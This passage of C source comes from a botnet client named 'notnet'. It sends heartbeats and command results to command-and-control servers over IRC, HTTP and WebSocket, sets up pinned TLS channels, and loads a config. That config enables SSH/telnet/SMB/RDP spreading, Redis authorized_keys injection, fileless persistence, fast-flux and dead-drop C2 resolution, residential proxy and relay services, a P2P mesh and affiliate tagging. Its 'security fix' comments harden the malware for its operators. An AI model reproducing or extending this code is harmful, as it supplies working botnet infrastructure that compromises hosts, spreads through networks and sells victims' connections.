        NOTNET_VERSION, safe_hostname, (long)(time(NULL) - bot->uptime), bot->scan_count,
        spread_cred_count(), safe_secret, proxy_is_running() ? 1 : 0, proxy_get_port(),
        relay_is_running() ? 1 : 0, relay_get_port(), safe_tag);
    if (ret < 0 || (size_t)ret >= sizeof(heartbeat)) {
        log_warn("Heartbeat truncated: need %d bytes, buffer %zu", ret, sizeof(heartbeat));
    }
    
    /* Send via IRC */
    if (bot->c2_irc.connected && bot->c2_irc.authenticated) {
        irc_send(bot, "PRIVMSG %s :%s", bot->c2_irc.channel, heartbeat);
    }
    
    /* Send via HTTP */
    if (bot->c2_http.connected) {
        if (http_post(bot, heartbeat, strlen(heartbeat)) < 0) {
            log_warn("Heartbeat: HTTP post failed");
        }
        /* http_read() in protocol_process_commands() will pick up
         * the response on the next loop iteration */
    }
    
    /* Send via WebSocket */
    if (bot->c2_ws.connected) {
        ws_send(bot, heartbeat, strlen(heartbeat));
    }
    
    return 0;
}

int protocol_resolve_host(const char *host) {
    /* SECURITY FIX (#3): Use getaddrinfo instead of gethostbyname.
     * Returns a resolved IPv4 address in network byte order, or -1 on failure. */
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    int err = getaddrinfo(host, NULL, &hints, &res);
    if (err != 0) return -1;
    
    int result = -1;
    if (res && res->ai_family == AF_INET) {
        struct sockaddr_in *sin = (struct sockaddr_in *)res->ai_addr;
        result = sin->sin_addr.s_addr;  /* already in network byte order */
    }
    
    freeaddrinfo(res);
    return result;
}

char *protocol_hex_encode(const char *data, int len) {
    static char buf[1024];
    int pos = 0;
    
    for (int i = 0; i < len && pos < 1023; i++) {
        pos += snprintf(buf + pos, 3, "%02x", (unsigned char)data[i]);
    }
    
    buf[pos] = '\0';
    return buf;
}

int protocol_send_response(notnet_bot_t *bot, const char *command, const char *result) {
    /* SECURITY FIX (#1): Escape command and result to prevent JSON injection
     * that could corrupt C2 protocol parsing or inject commands. */
    char safe_cmd[256];
    char safe_result[1024];
    json_escape(command, safe_cmd, sizeof(safe_cmd));
    json_escape(result, safe_result, sizeof(safe_result));

    /* SECURITY FIX (#16): Increase response buffer to accommodate all
     * escaped fields without truncation. safe_result alone is 1024 bytes. */
    char response[2048];
    /* SECURITY FIX (#1): Also escape hostname for JSON safety */
    char safe_hostname[BOT_MAX_HOSTNAME_LEN];
    json_escape(bot->hostname, safe_hostname, sizeof(safe_hostname));
    int ret = snprintf(response, sizeof(response),
        "{\"cmd\":\"%s\",\"result\":\"%s\",\"hostname\":\"%s\"}",
        safe_cmd, safe_result, safe_hostname);
    if (ret < 0 || (size_t)ret >= sizeof(response)) {
        log_warn("Response truncated: need %d bytes, buffer %zu", ret, sizeof(response));
    }
    int len = strlen(response);
    
    /* Send response via IRC */
    if (bot->c2_irc.connected && bot->c2_irc.authenticated) {
        irc_send(bot, "PRIVMSG %s :%s", bot->c2_irc.channel, response);
        log_info("IRC: response sent (%d bytes)", len);
    }
    
    /* Send response via HTTP */
    if (bot->c2_http.connected) {
        if (http_post(bot, response, len) < 0) {
            log_warn("Response: HTTP post failed");
        } else {
            log_info("HTTP: response sent (%d bytes)", len);
        }
    }
    
    /* Send response via WebSocket */
    if (bot->c2_ws.connected) {
        ws_send(bot, response, len);
        log_info("WS: response sent (%d bytes)", len);
    }
    
    return len;
}

/* ── TLS ─────────────────────────────────────────────────────── */
#ifdef TLS_ENABLED
#include <openssl/ssl.h>
#include <openssl/err.h>

static SSL_CTX *tls_ctx = NULL;
static int tls_init_once = 0;

int tls_init(notnet_tls_t *tls, int sock) {
    if (!tls) return -1;

    tls->sock = sock;
    tls->enabled = 0;
    tls->ssl = NULL;

    /* Lazy init OpenSSL library */
    if (!tls_init_once) {
        SSL_library_init();
        SSL_load_error_strings();
        tls_init_once = 1;
    }

    /* Create context if needed */
    if (!tls_ctx) {
        const SSL_METHOD *meth = TLS_client_method();
        tls_ctx = SSL_CTX_new(meth);
        if (!tls_ctx) {
            log_error("TLS: SSL_CTX_new failed");
            return -1;
        }
        /* Minimal TLS config: allow TLS 1.2+ */
        unsigned long opts = SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1 | SSL_OP_NO_TLSv1_1;
        SSL_CTX_set_options(tls_ctx, opts);
        /* Disable cert verification for research use (pinning via C2) */
        SSL_CTX_set_verify(tls_ctx, SSL_VERIFY_NONE, NULL);
    }

    tls->ssl = SSL_new(tls_ctx);
    if (!tls->ssl) {
        log_error("TLS: SSL_new failed");
        return -1;
    }

    SSL_set_fd(tls->ssl, sock);
    tls->enabled = 1;
    return 0;
}

/* SECURITY FIX (#76): Compute the SHA-256 fingerprint (hex) of the
 * peer's certificate. Caller provides a 65-byte buffer. */
static int tls_peer_fingerprint(notnet_tls_t *tls, char out[65]) {
    if (!tls || !tls->ssl || !tls->enabled) return -1;
    X509 *cert = SSL_get_peer_certificate(tls->ssl);
    if (!cert) {
        log_error("TLS: no peer certificate presented");
        return -1;
    }
    unsigned char der[4096];
    int der_len = i2d_X509(cert, NULL);
    if (der_len <= 0 || der_len > (int)sizeof(der)) {
        X509_free(cert);
        return -1;
    }
    unsigned char *p = der;
    i2d_X509(cert, &p);
    X509_free(cert);

    unsigned char digest[32];
    SHA256(der, (size_t)der_len, digest);
    static const char hexd[] = "0123456789abcdef";
    for (int i = 0; i < 32; i++) {
        out[i * 2]     = hexd[digest[i] >> 4];
        out[i * 2 + 1] = hexd[digest[i] & 0x0F];
    }
    out[64] = '\0';
    return 0;
}

/* SECURITY FIX (#76): Upgrade a connected socket to TLS and verify the
 * peer certificate fingerprint against the configured pin. When TLS is
 * not compiled in, or no pin is configured, the channel stays plaintext
 * (tls->enabled = 0) and all I/O falls through to raw send/recv.
 * Returns 0 on success (plaintext or verified TLS), -1 on failure. */
int tls_setup(notnet_tls_t *tls, int sock, const char *server_name,
              const char *pin_hex) {
    if (!tls) return -1;
    tls->sock = sock;
    tls->enabled = 0;
    tls->ssl = NULL;
#ifdef TLS_ENABLED
    if (!pin_hex || pin_hex[0] == '\0') {
        log_info("TLS: no cert pin configured — channel stays plaintext");
        return 0;
    }
    if (tls_init(tls, sock) != 0) return -1;
    if (tls_handshake(tls, server_name) != 0) {
        tls_close(tls);
        return -1;
    }
    char fp[65];
    if (tls_peer_fingerprint(tls, fp) != 0) {
        tls_close(tls);
        return -1;
    }
    if (strcmp(fp, pin_hex) != 0) {
        log_error("TLS: cert fingerprint mismatch — expected %s, got %s",
                  pin_hex, fp);
        tls_close(tls);
        return -1;
    }
    log_info("TLS: certificate fingerprint verified (%s)", fp);
#else
    if (pin_hex && pin_hex[0] != '\0') {
        log_warn("TLS: cert pin configured but TLS not compiled in — "
                 "run 'make TLS=1'; channel stays plaintext");
    }
#endif
    return 0;
}

/* Channel I/O dispatchers: route through TLS when the channel is
 * upgraded, otherwise fall back to the raw socket. */

/* Bytes of decrypted data already buffered by the TLS layer (0 if TLS
 * is off). Read loops must check this before select(), because select()
 * only sees the raw socket, not SSL's internal buffer. */
int tls_pending(notnet_tls_t *tls) {
#ifdef TLS_ENABLED
    if (tls && tls->enabled && tls->ssl) {
        return SSL_pending(tls->ssl);
    }
#endif
    return 0;
}

int chan_send(notnet_tls_t *tls, int sock, const char *buf, int len) {
    if (tls && tls->enabled) return tls_send(tls, buf, len);
    return send(sock, buf, len, 0);
}

int chan_recv(notnet_tls_t *tls, int sock, char *buf, int len) {
    if (tls && tls->enabled) return tls_recv(tls, buf, len);
    return recv(sock, buf, len, 0);
}

int tls_handshake(notnet_tls_t *tls, const char *server_name) {
    if (!tls || !tls->ssl) return -1;

    /* Set SNI for the server name */
    if (server_name) {
        SSL_set_tlsext_host_name(tls->ssl, server_name);
    }

    int ret = SSL_connect(tls->ssl);
    if (ret <= 0) {
        int err = SSL_get_error(tls->ssl, ret);
        log_error("TLS: handshake failed (error %d)", err);
        return -1;
    }

    log_info("TLS: connected using %s", SSL_get_cipher(tls->ssl));
    return 0;
}

int tls_send(notnet_tls_t *tls, const char *buf, int len) {
    if (!tls || !tls->ssl || !tls->enabled) {
        /* Fallback: raw send */
        return send(tls->sock, buf, len, 0);
    }

    int sent = SSL_write(tls->ssl, buf, len);
    if (sent <= 0) {
        log_warn("TLS: write failed (error %d)", SSL_get_error(tls->ssl, sent));
        return -1;
    }
    return sent;
}

int tls_recv(notnet_tls_t *tls, char *buf, int len) {
    if (!tls || !tls->ssl || !tls->enabled) {
        /* Fallback: raw recv */
        return recv(tls->sock, buf, len, 0);
    }

    /* SECURITY FIX (#121): the first read after the handshake often hits
     * the server's pending control records (e.g. NewSessionTicket):
     * SSL_read consumes them and returns SSL_ERROR_WANT_READ. The old
     * code returned -1, the callers treated it as a dead connection,
     * reconnected, and wedged — the bot never sent its first heartbeat.
     * SSL_read on a BLOCKING socket never returns WANT_READ (it blocks
     * internally), so the socket is toggled non-blocking for the read;
     * on WANT_READ/WANT_WRITE we poll the raw socket briefly and retry,
     * and if it goes quiet (control records consumed, no application
     * data this poll) return -2 which the channel read loops treat as
     * "no data, keep connected". */
    int fl = fcntl(tls->sock, F_GETFL, 0);
    fcntl(tls->sock, F_SETFL, fl | O_NONBLOCK);

    for (int attempt = 0; attempt < 5; attempt++) {
        int received = SSL_read(tls->ssl, buf, len);
        if (received > 0) {
            fcntl(tls->sock, F_SETFL, fl);
            return received;
        }
        int err = SSL_get_error(tls->ssl, received);
        if (err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) {
            fcntl(tls->sock, F_SETFL, fl);   /* blocking for the poll */
            fd_set rfds;
            FD_ZERO(&rfds);
            FD_SET(tls->sock, &rfds);
            struct timeval tv;
            tv.tv_sec = 0;
            tv.tv_usec = 200000;   /* 200ms: short poll for more raw data */
            int sel = select(tls->sock + 1, &rfds, NULL, NULL, &tv);
            if (sel > 0) {
                fcntl(tls->sock, F_SETFL, fl | O_NONBLOCK);
                continue;
            }
            return -2;
        }
        if (err != SSL_ERROR_ZERO_RETURN) {
            log_warn("TLS: read failed (error %d)", err);
        }
        fcntl(tls->sock, F_SETFL, fl);
        return -1;
    }
    fcntl(tls->sock, F_SETFL, fl);
    return -2;
}

void tls_close(notnet_tls_t *tls) {
    if (!tls) return;

    if (tls->ssl) {
        SSL_shutdown(tls->ssl);
        SSL_free(tls->ssl);
        tls->ssl = NULL;
    }
    tls->enabled = 0;
}

void tls_cleanup(void) {
    if (tls_ctx) {
        SSL_CTX_free(tls_ctx);
        tls_ctx = NULL;
    }
    tls_init_once = 0;
}

#else /* TLS_ENABLED not defined */

int tls_init(notnet_tls_t *tls, int sock) {
    if (!tls) return -1;
    tls->sock = sock;
    tls->enabled = 0;
    tls->ssl = NULL;
    return 0;
}

int tls_setup(notnet_tls_t *tls, int sock, const char *server_name,
              const char *pin_hex) {
    (void)server_name;
    if (!tls) return -1;
    tls->sock = sock;
    tls->enabled = 0;
    tls->ssl = NULL;
    if (pin_hex && pin_hex[0] != '\0') {
        log_warn("TLS: cert pin configured but TLS not compiled in — "
                 "run 'make TLS=1'; channel stays plaintext");
    }
    return 0;
}

int tls_pending(notnet_tls_t *tls) {
    (void)tls;
    return 0;
}

int chan_send(notnet_tls_t *tls, int sock, const char *buf, int len) {
    (void)tls;
    return send(sock, buf, len, 0);
}

int chan_recv(notnet_tls_t *tls, int sock, char *buf, int len) {
    (void)tls;
    return recv(sock, buf, len, 0);
}

int tls_handshake(notnet_tls_t *tls, const char *server_name) {
    (void)tls;
    (void)server_name;
    return 0;
}

int tls_send(notnet_tls_t *tls, const char *buf, int len) {
    if (!tls || !tls->enabled) return -1;
    return send(tls->sock, buf, len, 0);
}

int tls_recv(notnet_tls_t *tls, char *buf, int len) {
    if (!tls || !tls->enabled) return -1;
    return recv(tls->sock, buf, len, 0);
}

void tls_close(notnet_tls_t *tls) {
    if (!tls) return;
    tls->enabled = 0;
    tls->ssl = NULL;
}

void tls_cleanup(void) {
    /* No-op when TLS disabled */
}

#endif /* TLS_ENABLED */

/* Small hex-digit helper for config validation (mesh pubkey etc.). */
static int hexval_mesh(int c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/* ── Config Loading ──────────────────────────────────────────── */
int load_config(notnet_bot_t *bot, const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) {
        log_info("No config file at %s, using defaults", path);
        return -1;
    }

    /* SECURITY FIX (#82): Explicit enable/disable keys. Track whether each
     * was seen so the port-based auto-detect below cannot override an
     * explicit <proto>_enabled=0. */
    int http_explicit = 0, ws_explicit = 0;
    
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        /* Remove newline */
        line[strcspn(line, "\n")] = '\0';
        
        /* Skip comments and empty lines */
        if (line[0] == '#' || line[0] == '\0') continue;
        
        /* Parse key=value */
        char *eq = strchr(line, '=');
        if (!eq) continue;
        *eq = '\0';
        
        char *key = line;
        char *value = eq + 1;
        
        if (strcmp(key, "irc_server") == 0) {
            strncpy(bot->c2_irc.server, value, 255);
            bot->c2_irc.server[255] = '\0';
        } else if (strcmp(key, "irc_port") == 0) {
            bot->c2_irc.port = atoi(value);
        } else if (strcmp(key, "http_server") == 0) {
            strncpy(bot->c2_http.server, value, 255);
            bot->c2_http.server[255] = '\0';
        } else if (strcmp(key, "http_port") == 0) {
            bot->c2_http.port = atoi(value);
        } else if (strcmp(key, "scan_interval") == 0) {
            /* SECURITY FIX (#48): clamp scan_interval on load. A config
             * value of 0 made the main loop usleep(0) → busy-loop into
             * an unthrottled scan storm. Accept 1..3600 seconds. */
            int v = atoi(value);
            if (v >= 1 && v <= 3600) {
                bot->scan_interval = (uint32_t)v;
            } else {
                log_warn("Config: scan_interval=%d out of range (1-3600), keeping %u",
                         v, bot->scan_interval);
            }
        } else if (strcmp(key, "ssh_enabled") == 0) {
            bot->ssh_enabled = atoi(value);
        } else if (strcmp(key, "telnet_enabled") == 0) {
            bot->telnet_enabled = atoi(value);
        } else if (strcmp(key, "scan_timeout_ms") == 0) {
            bot->scan_timeout_ms = atoi(value);
        } else if (strcmp(key, "scan_max_hosts") == 0) {
            bot->scan_max_hosts = atoi(value);
        } else if (strcmp(key, "heartbeat_interval") == 0) {
            if (atoi(value) > 0) bot->heartbeat_interval = atoi(value);
        } else if (strcmp(key, "irc_channel") == 0) {
            strncpy(bot->c2_irc.channel, value, 127);
            bot->c2_irc.channel[127] = '\0';
            log_info("IRC channel set to %s", bot->c2_irc.channel);
        } else if (strcmp(key, "irc_pass") == 0) {
            strncpy(bot->c2_irc.pass, value, 63);
            bot->c2_irc.pass[63] = '\0';
        } else if (strcmp(key, "c2_secret") == 0) {
            /* SECURITY FIX (#35): Shared secret for HTTP/WS command auth.
             * Restrict to alphanumeric so the response-echo check is
             * unambiguous (no JSON escaping needed in the needle). */
            int valid = 1;
            for (const char *p = value; *p; p++) {
                if (!((*p >= 'a' && *p <= 'z') || (*p >= 'A' && *p <= 'Z') ||
                      (*p >= '0' && *p <= '9'))) {
                    valid = 0;
                    break;
                }
            }
            if (valid && value[0] != '\0') {
                strncpy(bot->secret, value, sizeof(bot->secret) - 1);
                bot->secret[sizeof(bot->secret) - 1] = '\0';
                log_info("C2: shared secret configured (%zu chars)",
                         strlen(bot->secret));
            } else {
                log_warn("C2: c2_secret rejected — use alphanumeric only");
            }
        } else if (strcmp(key, "payload_sha256") == 0) {
            /* SECURITY FIX (#81): Expected payload hash. Validate 64 hex
             * chars; reject anything else so a typo cannot silently
             * disable verification. */
            int valid = 0;
            if (strlen(value) == 64) {
                valid = 1;
                for (const char *p = value; *p; p++) {
                    if (!((*p >= '0' && *p <= '9') ||
                          (*p >= 'a' && *p <= 'f') ||
                          (*p >= 'A' && *p <= 'F'))) {
                        valid = 0;
                        break;
                    }
                }
            }
            if (valid) {
                /* Normalize to lowercase */
                for (int i = 0; i < 64; i++) {
                    if (value[i] >= 'A' && value[i] <= 'F') value[i] += ('a' - 'A');
                }
                strncpy(bot->payload_sha256, value, 64);
                bot->payload_sha256[64] = '\0';
                log_info("Payload SHA-256 pin configured");
            } else {
                log_warn("Config: payload_sha256 rejected — need 64 hex chars");
            }
        } else if (strcmp(key, "tls_cert_pin_sha256") == 0) {
            /* SECURITY FIX (#76): TLS cert fingerprint pin. Validate 64
             * hex chars like payload_sha256. */
            int valid = 0;
            if (strlen(value) == 64) {
                valid = 1;
                for (const char *p = value; *p; p++) {
                    if (!((*p >= '0' && *p <= '9') ||
                          (*p >= 'a' && *p <= 'f') ||
                          (*p >= 'A' && *p <= 'F'))) {
                        valid = 0;
                        break;
                    }
                }
            }
            if (valid) {
                for (int i = 0; i < 64; i++) {
                    if (value[i] >= 'A' && value[i] <= 'F') value[i] += ('a' - 'A');
                }
                strncpy(bot->tls_cert_pin_sha256, value, 64);
                bot->tls_cert_pin_sha256[64] = '\0';
                log_info("TLS cert pin configured");
            } else {
                log_warn("Config: tls_cert_pin_sha256 rejected — need 64 hex chars");
            }
        } else if (strcmp(key, "payload_compile_enabled") == 0) {
            /* SECURITY FIX (#69): on-target compilation toggle */
            bot->payload_compile_enabled = (atoi(value) != 0);
        } else if (strcmp(key, "payload_source_url") == 0) {
            strncpy(bot->payload_source_url, value, sizeof(bot->payload_source_url) - 1);
            bot->payload_source_url[sizeof(bot->payload_source_url) - 1] = '\0';
        } else if (strcmp(key, "payload_source_sha256") == 0) {
            /* SECURITY FIX (#81): pin for the source tarball. Same 64-hex
             * validation as payload_sha256. */
            int valid = 0;
            if (strlen(value) == 64) {
                valid = 1;
                for (const char *p = value; *p; p++) {
                    if (!((*p >= '0' && *p <= '9') ||
                          (*p >= 'a' && *p <= 'f') ||
                          (*p >= 'A' && *p <= 'F'))) {
                        valid = 0;
                        break;
                    }
                }
            }
            if (valid) {
                for (int i = 0; i < 64; i++) {
                    if (value[i] >= 'A' && value[i] <= 'F') value[i] += ('a' - 'A');
                }
                strncpy(bot->payload_source_sha256, value, 64);
                bot->payload_source_sha256[64] = '\0';
                log_info("Payload source SHA-256 pin configured");
            } else {
                log_warn("Config: payload_source_sha256 rejected — need 64 hex chars");
            }
        } else if (strcmp(key, "irc_auth_nicks") == 0) {
            /* SECURITY FIX (#5): Comma-separated authorized C2 operator nicks.
             * Only PRIVMSGs from these nicks will be processed as commands. */
            bot->c2_irc.auth_nick_count = 0;
            char nicks[512];
            strncpy(nicks, value, sizeof(nicks) - 1);
            nicks[sizeof(nicks) - 1] = '\0';
            char *saveptr = NULL;
            char *tok = strtok_r(nicks, ",", &saveptr);
            while (tok && bot->c2_irc.auth_nick_count < 8) {
                /* Trim whitespace */
                while (*tok == ' ' || *tok == '\t') tok++;
                char *end = tok + strlen(tok) - 1;
                while (end > tok && (*end == ' ' || *end == '\t')) *end-- = '\0';
                if (*tok) {
                    strncpy(bot->c2_irc.auth_nicks[bot->c2_irc.auth_nick_count],
                            tok, 31);
                    bot->c2_irc.auth_nicks[bot->c2_irc.auth_nick_count][31] = '\0';
                    bot->c2_irc.auth_nick_count++;
                }
                tok = strtok_r(NULL, ",", &saveptr);
            }
            if (bot->c2_irc.auth_nick_count == 0) {
                /* Default: no one authorized (fail-closed) */
                log_warn("IRC: irc_auth_nicks not set - no nicks authorized");
            } else {
                log_info("IRC: %d authorized nicks configured", bot->c2_irc.auth_nick_count);
            }
        } else if (strcmp(key, "http_path") == 0) {
            strncpy(bot->c2_http.path, value, 127);
            bot->c2_http.path[127] = '\0';
        } else if (strcmp(key, "http_user_agent") == 0) {
            strncpy(bot->c2_http.user_agent, value, 127);
            bot->c2_http.user_agent[127] = '\0';
        } else if (strcmp(key, "ws_path") == 0) {
            strncpy(bot->c2_ws.path, value, 127);
            bot->c2_ws.path[127] = '\0';
        } else if (strcmp(key, "ws_server") == 0) {
            strncpy(bot->c2_ws.server, value, 255);
            bot->c2_ws.server[255] = '\0';
        } else if (strcmp(key, "ws_port") == 0) {
            bot->c2_ws.port = atoi(value);
        } else if (strcmp(key, "smb_enabled") == 0) {
            bot->smb_enabled = atoi(value);
        } else if (strcmp(key, "redis_enabled") == 0) {
            bot->redis_enabled = atoi(value);
        } else if (strcmp(key, "redis_ssh_key") == 0) {
            /* SECURITY FIX (#72): Provisioned SSH key for the Redis
             * authorized_keys injection vector. Reject the old literal
             * placeholder. */
            if (strstr(value, "notnet-key") || strstr(value, "...")) {
                log_warn("Config: redis_ssh_key rejected (placeholder value)");
            } else {
                strncpy(bot->redis_ssh_key, value, sizeof(bot->redis_ssh_key) - 1);
                bot->redis_ssh_key[sizeof(bot->redis_ssh_key) - 1] = '\0';
            }
        } else if (strcmp(key, "rdp_enabled") == 0) {
            bot->rdp_enabled = atoi(value);
        } else if (strcmp(key, "persist_enabled") == 0) {
            /* SECURITY FIX (#84): 0 = RAM-only fileless mode (no
             * persistence install; memfd self-relaunch on Linux). */
            bot->persist_enabled = (atoi(value) != 0);
        /* SECURITY FIX (#82): Explicit <proto>_enabled keys. These take
         * precedence over port-based auto-detect — a non-default port
         * implies the protocol is wanted, but to disable a protocol while
         * keeping its default port, set <proto>_enabled=0. */
        } else if (strcmp(key, "irc_enabled") == 0) {
            /* SECURITY FIX (#87): IRC C2 is deprecated — off by default.
             * Only an explicit irc_enabled=1 re-enables it; the port-based
             * auto-detect below no longer enables IRC. Code stays intact for
             * compatibility. */
            if (atoi(value) != 0) bot->c2_enabled |= C2_IRC;
            else bot->c2_enabled &= ~C2_IRC;
        } else if (strcmp(key, "http_enabled") == 0) {
            http_explicit = 1;
            if (atoi(value) != 0) bot->c2_enabled |= C2_HTTP;
            else bot->c2_enabled &= ~C2_HTTP;
        } else if (strcmp(key, "ws_enabled") == 0) {
            ws_explicit = 1;
            if (atoi(value) != 0) bot->c2_enabled |= C2_WS;
            else bot->c2_enabled &= ~C2_WS;
        } else if (strcmp(key, "scan_targets") == 0) {
            /* README-documented format: scan_targets=192.168.1.0/24 */
            bot->scan_target_count = 0;
            char targets[512];
            strncpy(targets, value, sizeof(targets) - 1);
            targets[sizeof(targets) - 1] = '\0';
            char *saveptr = NULL;
            char *tok = strtok_r(targets, ",", &saveptr);
            while (tok && bot->scan_target_count < 16) {
                while (*tok == ' ' || *tok == '\t') tok++;
                if (*tok) {
                    strncpy(bot->scan_targets[bot->scan_target_count], tok, 255);
                    bot->scan_targets[bot->scan_target_count][255] = '\0';
                    bot->scan_target_count++;
                }
                tok = strtok_r(NULL, ",", &saveptr);
            }
        } else if (strncmp(key, "scan_target_", 12) == 0) {
            /* Legacy: scan_target_0, scan_target_1, etc. */
            int idx = atoi(key + 12);
            if (idx >= 0 && idx < 16 && bot->scan_target_count <= idx) {
                bot->scan_target_count = idx + 1;
                strncpy(bot->scan_targets[idx], value, 255);
                bot->scan_targets[idx][255] = '\0';
            }
        } else if (strcmp(key, "flux_enabled") == 0) {
            /* SECURITY FIX (#85): fast-flux C2 toggle (default 0) */
            bot->flux_enabled = (atoi(value) != 0);
        } else if (strcmp(key, "flux_ttl") == 0) {
            /* SECURITY FIX (#85): clamp like scan_interval — a 0 TTL
             * would re-resolve on every connect. Accept 1..3600s. */
            int v = atoi(value);
            if (v >= 1 && v <= 3600) {
                bot->flux_ttl = (uint32_t)v;
            } else {
                log_warn("Config: flux_ttl=%d out of range (1-3600), keeping %u",
                         v, bot->flux_ttl);
            }
        } else if (strcmp(key, "dead_drop_url") == 0) {
            /* SECURITY FIX (#86): dead-drop C2 resolution endpoint. */
            strncpy(bot->dead_drop_url, value, sizeof(bot->dead_drop_url) - 1);
            bot->dead_drop_url[sizeof(bot->dead_drop_url) - 1] = '\0';
        } else if (strcmp(key, "dead_drop_interval") == 0) {
            /* SECURITY FIX (#86): clamp the re-resolution interval. A 0
             * would hammer the drop every loop. Accept 30..86400s. */
            int v = atoi(value);
            if (v >= 30 && v <= 86400) {
                bot->dead_drop_interval = (uint32_t)v;
            } else {
                log_warn("Config: dead_drop_interval=%d out of range (30-86400), keeping %u",
                         v, bot->dead_drop_interval);
            }
        } else if (strcmp(key, "proxy_enabled") == 0) {
            /* SECURITY FIX (#89): residential SOCKS5 proxy toggle. The
             * accept thread is started at boot (notnet.c) only when this is
             * 1 AND a proxy_token is set. */
            bot->proxy_enabled = (atoi(value) != 0);
        } else if (strcmp(key, "proxy_port") == 0) {
            int v = atoi(value);
            if (v >= 1 && v <= 65535) {
                bot->proxy_port = (uint16_t)v;
            } else {
                log_warn("Config: proxy_port=%d out of range (1-65535), keeping %u",
                         v, bot->proxy_port);
            }
        } else if (strcmp(key, "proxy_token") == 0) {
            strncpy(bot->proxy_token, value, sizeof(bot->proxy_token) - 1);
            bot->proxy_token[sizeof(bot->proxy_token) - 1] = '\0';
        } else if (strcmp(key, "relay_enabled") == 0) {
            /* SECURITY FIX (#91): ORB-style relay toggle. The accept
             * thread is started at boot (notnet.c) only when this is 1
             * AND a relay_token is set. */
            bot->relay_enabled = (atoi(value) != 0);
        } else if (strcmp(key, "relay_port") == 0) {
            int v = atoi(value);
            if (v >= 1 && v <= 65535) {
                bot->relay_port = (uint16_t)v;
            } else {
                log_warn("Config: relay_port=%d out of range (1-65535), keeping %u",
                         v, bot->relay_port);
            }
        } else if (strcmp(key, "relay_token") == 0) {
            strncpy(bot->relay_token, value, sizeof(bot->relay_token) - 1);
            bot->relay_token[sizeof(bot->relay_token) - 1] = '\0';
        } else if (strncmp(key, "mesh_static_peers_", 18) == 0) {
            /* SECURITY FIX (#139): static bootstrap peers for the P2P
             * mesh, mesh_static_peers_1..N = host:port. */
            int idx = atoi(key + 18);
            if (idx >= 1 && idx <= MESH_PEER_MAX) {
                strncpy(bot->mesh_static_peers[idx - 1], value,
                        sizeof(bot->mesh_static_peers[0]) - 1);
                bot->mesh_static_peers[idx - 1][sizeof(bot->mesh_static_peers[0]) - 1] = '\0';
            }
        } else if (strcmp(key, "mesh_enabled") == 0) {
            bot->mesh_enabled = (atoi(value) != 0);
        } else if (strcmp(key, "mesh_port") == 0) {
            int v = atoi(value);
            if (v >= 1 && v <= 65535) bot->mesh_port = (uint16_t)v;
        } else if (strcmp(key, "mesh_operator_pubkey") == 0) {
            /* SECURITY FIX (#139): operator ed25519 pubkey (64 hex).
             * Validated at mesh_start(); rejected if not 64 hex. */
            int valid = (strlen(value) == 64);
            if (valid) {
                for (const char *p = value; *p; p++) {
                    int h = hexval_mesh(*p);
                    if (h < 0) { valid = 0; break; }
                }
            }
            if (valid) {
                strncpy(bot->mesh_operator_pubkey, value, 64);
                bot->mesh_operator_pubkey[64] = '\0';
            } else {
                log_warn("Config: mesh_operator_pubkey rejected — need 64 hex chars");
            }
            /* SECURITY FIX (#92): loader/plugin framework toggle. The
             * built-in plugin registry is bootstrapped at boot and the
             * `plugin` C2 command dispatches plugins by name. */
            bot->plugin_enabled = (atoi(value) != 0);
        } else if (strcmp(key, "byovd_guard") == 0) {
            /* SECURITY FIX (#94): BYOVD defense-neutralization guard.
             * The byovd plugin is a defensive-only research scaffold
             * (no driver-loading code ships); when set, its load
             * callback reports that BYOVD-style driver abuse is
             * blocked. */
            bot->byovd_guard = (atoi(value) != 0);
        } else if (strncmp(key, "c2_backup_", 10) == 0) {
            /* SECURITY FIX (#93): disposable-infrastructure backup
             * endpoints, c2_backup_<n> = host:port with n in 1..4.
             * The chain must be contiguous from c2_backup_1;
             * c2_backup_count is the length of the contiguous prefix
             * (a gap leaves later entries unreachable). Invalid specs
             * are rejected with a warning, not silently stored. */
            int idx = atoi(key + 10);
            if (idx < 1 || idx > C2_BACKUP_MAX) {
                log_warn("Config: %s out of range (c2_backup_1..%d)",
                         key, C2_BACKUP_MAX);
            } else {
                char ehost[256];
                uint16_t eport = 0;
                if (c2_rotation_parse_endpoint(value, ehost, sizeof(ehost),
                                               &eport) != 0) {
                    log_warn("Config: %s rejected — expected host:port", key);
                } else {
                    strncpy(bot->c2_backup[idx - 1], value,
                            sizeof(bot->c2_backup[0]) - 1);
                    bot->c2_backup[idx - 1][sizeof(bot->c2_backup[0]) - 1] = '\0';
                    bot->c2_backup_count = 0;
                    for (int i = 0; i < C2_BACKUP_MAX; i++) {
                        if (bot->c2_backup[i][0] == '\0') break;
                        bot->c2_backup_count = (uint8_t)(i + 1);
                    }
                }
            }
        } else if (strcmp(key, "bot_tag") == 0) {
            /* SECURITY FIX (#93): affiliate/operator tag — the
             * affiliate-model primitive. Bounded to BOT_TAG_MAX
             * chars, reported in every heartbeat so the C2 can
             * attribute bots to affiliates. */
            strncpy(bot->bot_tag, value, BOT_TAG_MAX - 1);
            bot->bot_tag[BOT_TAG_MAX - 1] = '\0';
        }
    }
    
    /* Auto-detect enabled protocols from config.
     * SECURITY FIX (#82): Port-based auto-detect only applies when no
     * explicit <proto>_enabled key was given. An explicit 0 must stick.
     * SECURITY FIX (#87): IRC is excluded from auto-detect — deprecated,
     * trivially sinkholed, off by default; only explicit irc_enabled=1
     * re-enables it. HTTP/WS remain the primary channels. */
    if (!http_explicit && bot->c2_http.port != HTTP_DEFAULT_PORT) {
        bot->c2_enabled |= C2_HTTP;
        log_info("C2: HTTP enabled (%s:%d)", bot->c2_http.server, bot->c2_http.port);
    }
    if (!ws_explicit && bot->c2_ws.port != WS_DEFAULT_PORT) {
        bot->c2_enabled |= C2_WS;
        log_info("C2: WebSocket enabled (%s:%d)", bot->c2_ws.server, bot->c2_ws.port);
    }
    if (bot->c2_enabled == 0) {
        log_info("C2: no protocols enabled (use irc_server/http_server/http_port)");
    }
    
    fclose(f);
    log_info("Config loaded from %s", path);
    return 0;
}
